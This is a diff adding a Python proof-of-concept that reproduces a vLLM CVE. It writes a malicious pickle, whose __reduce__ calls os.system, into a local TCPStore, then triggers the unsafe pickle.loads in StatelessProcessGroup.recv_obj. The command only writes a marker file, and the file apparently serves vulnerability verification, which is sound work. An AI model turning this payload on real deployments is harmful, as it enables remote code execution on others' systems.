@@ -1,0 +1,117 @@
+"""CVE-2025-47277 function-level reproduction.
+
+Pinned vLLM v0.8.4 ``vllm/distributed/utils.py`` implements
+``StatelessProcessGroup.recv_obj`` as ``pickle.loads(self.store.get(...))``.
+The store is a torch TCPStore used as the PyNcclPipe control plane.  An actor
+that can write the rendezvous key (or reach the store) controls the pickle.
+
+The PoC imports the real upstream class, writes a malicious pickle into a real
+TCPStore with ``store.set``, and calls the real ``recv_obj``.
+"""
+
+from __future__ import annotations
+
+import importlib.util
+import json
+import logging
+import os
+import pickle
+import socket
+import sys
+import types
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+import poclib  # noqa: E402
+
+
+def _load_upstream(path: Path):
+    vllm = types.ModuleType("vllm")
+    vllm.__path__ = []
+    envs = types.ModuleType("vllm.envs")
+    envs.VLLM_HOST_IP = "127.0.0.1"
+    logger = types.ModuleType("vllm.logger")
+    logger.init_logger = lambda name: logging.getLogger(name)
+    sys.modules.update({"vllm": vllm, "vllm.envs": envs, "vllm.logger": logger})
+    spec = importlib.util.spec_from_file_location("uv_vllm_dist_utils", path)
+    module = importlib.util.module_from_spec(spec)
+    assert spec.loader is not None
+    spec.loader.exec_module(module)
+    return module
+
+
+def _free_port() -> int:
+    sock = socket.socket()
+    sock.bind(("127.0.0.1", 0))
+    port = sock.getsockname()[1]
+    sock.close()
+    return port
+
+
+def main() -> None:
+    import torch.distributed as dist
+    from torch.distributed import TCPStore
+
+    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
+    source = poclib.upstream_path(manifest["root_cause"]["source"])
+    if not source.is_file():
+        poclib.fail(f"missing pinned upstream source: {source}")
+    module = _load_upstream(source)
+
+    text = poclib.MARKER_TEXT
+    marker = str(poclib.MARKER_FILE)
+    poclib.start_marker("ABSENT")
+
+    class Evil:
+        def __reduce__(self):
+            return (os.system, (f'echo {text} > "{marker}"',))
+
+    port = _free_port()
+    store = TCPStore(
+        "127.0.0.1",
+        port,
+        world_size=1,
+        is_master=True,
+        wait_for_workers=False,
+        use_libuv=False,
+    )
+    group = module.StatelessProcessGroup(rank=0, world_size=1, store=store)
+    payload = pickle.dumps(Evil(), protocol=4)
+    store.set("send_to/0/0", payload)
+
+    post_sink_error = None
+    try:
+        group.recv_obj(0)
+    except Exception as exc:
+        post_sink_error = f"{type(exc).__name__}: {exc}"
+
+    if not poclib.marker_ok():
+        poclib.fail("marker was not written by StatelessProcessGroup.recv_obj", post_sink_error=post_sink_error)
+
+    poclib.finish_verified(
+        {
+            "transport": {
+                "type": "function+torch-TCPStore",
+                "entrypoint": "vllm.distributed.utils.StatelessProcessGroup.recv_obj",
+                "source": poclib.rel(source),
+                "source_sha256": poclib.sha256_file(source),
+                "store": f"tcp://127.0.0.1:{port}",
+                "key": "send_to/0/0",
+                "payload_sha256": poclib.sha256_text(payload.hex()),
+                "post_sink_error": post_sink_error,
+            },
+            "request_response": [
+                {
+                    "dir": "attacker-controlled store -> recv_obj",
+                    "payload": "pickle __reduce__ os.system(marker)",
+                    "result": "marker written by pickle.loads",
+                }
+            ],
+            "state_before": "marker=ABSENT",
+            "state_after": "marker contains proof text",
+        }
+    )
+
+
+if __name__ == "__main__":
+    main()
